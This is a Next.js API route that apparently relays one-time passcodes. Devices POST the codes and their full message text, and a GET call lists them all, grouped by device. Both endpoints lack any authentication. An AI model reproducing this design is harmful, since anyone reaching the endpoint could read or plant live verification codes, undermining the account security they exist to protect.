import { NextRequest, NextResponse } from "next/server";

export type OtpEntry = {
  otp: string;
  message: string;
  time: string;
  deviceId: string;
  deviceName: string;
};

const MAX_ITEMS = 100;
const EXPIRATION_MS = 15 * 60 * 1000; // 15 minutes

let items: OtpEntry[] = [];
const latestByDevice = new Map<string, OtpEntry>();

function cleanUpOldEntries() {
  const now = Date.now();
  items = items.filter((entry) => {
    const entryTime = new Date(entry.time).getTime();
    return now - entryTime <= EXPIRATION_MS;
  });

  for (const [deviceId, entry] of latestByDevice.entries()) {
    const entryTime = new Date(entry.time).getTime();
    if (now - entryTime > EXPIRATION_MS) {
      latestByDevice.delete(deviceId);
    }
  }
}

function addEntry(entry: OtpEntry) {
  cleanUpOldEntries();
  items.unshift(entry);
  if (items.length > MAX_ITEMS) items.pop();
  latestByDevice.set(entry.deviceId, entry);
}

export async function GET() {
  cleanUpOldEntries();
  const byDevice = Object.fromEntries(
    Array.from(latestByDevice.entries()).map(([k, v]) => [k, v])
  );
  return NextResponse.json({
    items: [...items],
    latestByDevice: byDevice,
  });
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const otp = body?.otp;
    const fullMessage =
      typeof body?.message === "string" ? body.message.trim() : "";
    const deviceId =
      typeof body?.deviceId === "string" && body.deviceId.trim()
        ? body.deviceId.trim()
        : "unknown";
    const deviceName =
      typeof body?.deviceName === "string" && body.deviceName.trim()
        ? body.deviceName.trim()
        : `เครื่อง ${deviceId.slice(0, 8)}`;

    if (!otp || typeof otp !== "string") {
      return NextResponse.json(
        { message: "Field 'otp' (string) is required" },
        { status: 400 },
      );
    }

    const entry: OtpEntry = {
      otp,
      message: fullMessage,
      time: new Date().toISOString(),
      deviceId,
      deviceName,
    };
    addEntry(entry);

    return NextResponse.json({ message: "ok" });
  } catch {
    return NextResponse.json(
      { message: "Invalid JSON payload" },
      { status: 400 },
    );
  }
}
